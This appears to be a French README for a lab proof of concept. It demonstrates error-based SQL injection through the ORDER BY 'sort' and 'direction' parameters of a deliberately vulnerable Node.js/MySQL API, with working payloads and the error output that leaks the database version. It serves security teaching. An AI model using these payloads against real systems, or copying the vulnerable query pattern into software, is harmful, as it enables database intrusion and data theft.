# PoC - Exploitation des injections SQL dans les clauses ORDER BY

## Installation

```
$ docker-compose build
$ docker-compose up -d
```

![image](https://github.com/user-attachments/assets/39419bea-36df-4182-a049-6e86d2c2a09a)

## Description

L'application, développée en NodeJS avec l'extension mysql, permet de rechercher des utilisateurs présents dans une base de données MySQL (Mariadb). Toutefois, les paramètres "sort" et "direction" utilisés au sein de la clause `ORDER BY` lors de l'appel à l'API sont sensibles aux injections SQL.

## Exploitation

Récupération de la version du système de base de données via le paramètre "sort" :

```sql
/users?search=&sort=username OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(CHAR(126),CAST(VERSION() AS NCHAR),CHAR(126),0x3a,floor(rand(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&direction=ASC&page=1&maxPerPage=5
```

```
Error: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~10.11.6-MariaDB-1:10.11.6+maria~ubu2204~:1' for key 'group_key'
```

Récupération de la version du système de base de données via le paramètre "direction" :

```sql
/users?search=&sort=username&direction=ASC,(SELECT 1 FROM(SELECT COUNT(*),CONCAT(CHAR(126),CAST(VERSION() AS NCHAR),CHAR(126),0x3a,floor(rand(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&page=1&maxPerPage=5
```

```
Error: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~10.11.6-MariaDB-1:10.11.6+maria~ubu2204~:1' for key 'group_key'
```

## Démo

![](https://github.com/Sharpforce/cybersecurity-code/blob/master/exploitation-des-injections-sql-au-sein-de-la-clause-order-by/Node.js-et-MySQL/demo/demo.gif)

## Disclaimer

Cet outil est destiné uniquement à des fins éducatives et doit être utilisé uniquement dans des environnements de tests de pénétration autorisés. L'accès ou l'utilisation non autorisés de systèmes que vous ne possédez pas est illégal. L'auteur n'est pas responsable de toute utilisation abusive de cet outil.

## License

Ce projet est sous licence MIT.